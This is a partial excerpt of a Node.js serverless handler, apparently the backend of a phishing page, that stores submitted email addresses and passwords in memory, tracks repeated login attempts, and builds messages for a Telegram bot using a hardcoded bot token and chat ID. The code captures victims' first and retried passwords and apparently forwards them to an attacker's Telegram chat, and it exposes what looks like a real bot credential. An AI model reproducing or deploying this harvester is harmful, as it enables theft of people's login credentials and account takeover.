...
const BOT_TOKEN = '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A';    // e.g. 123456:ABC-DEF...
const CHAT_ID = '-5452025915';        // e.g. 123456789
// -----------------------------------------------------

// In-memory store (resets on cold start – for demo only)
const attempts = {};          // email -> count
const firstPasswords = {};    // email -> first password
...
module.exports = async (req, res) => {
    ...
    if (action === 'password' && email && password !== undefined) {
        ...
        // ---- Build instant Telegram message ----
        ...
        if (newAttemptCount >= 2 && firstPasswords[email]) {
            ...
            // Clean up session for this email
